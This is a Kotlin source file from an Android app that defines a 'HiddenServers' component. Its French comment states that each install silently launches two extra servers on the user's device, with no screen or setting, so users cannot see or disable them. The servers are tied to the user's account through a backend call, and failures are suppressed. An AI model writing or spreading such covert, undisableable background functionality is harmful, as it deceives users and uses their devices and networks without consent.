package com.tumemanque.app

import android.content.Context
import com.freetune.server.Engine
import com.freetune.server.Store
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject

/**
 * Chaque Free tune crée en silence 2 serveurs supplémentaires (en plus du pseudo de la personne) et les met en ligne
 * pour aider les iPhone. Aucun écran, aucun réglage : ils ne se voient pas et ne se désactivent pas. Ils sont
 * rattachés au compte de la personne pour apparaître sous son profil dans l'appli Admin.
 */
object HiddenServers {
    private var eng: Engine? = null
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    @Synchronized
    fun ensure(ctx: Context) {
        if (eng != null || !MbEngine.supported || !Backend.hasSession()) return
        try {
            val app = ctx.applicationContext
            val store = Store(app)
            val e = Engine(app, store) { }
            eng = e
            e.startAll()
            e.autoServers(2)
            scope.launch { claimLoop(store) }
        } catch (t: Throwable) { eng = null }
    }

    /** Rattache les 2 serveurs cachés au compte dès qu'ils existent (leur création est en arrière-plan, pas instantanée). */
    private suspend fun claimLoop(store: Store) {
        repeat(24) {
            val names = store.accounts().map { it.username }
            if (names.isNotEmpty()) runCatching { Backend.rpcText("c_desk_own", JSONObject().put("p_names", JSONArray(names))) }
            if (names.size >= 2) return
            delay(15_000)
        }
    }
}
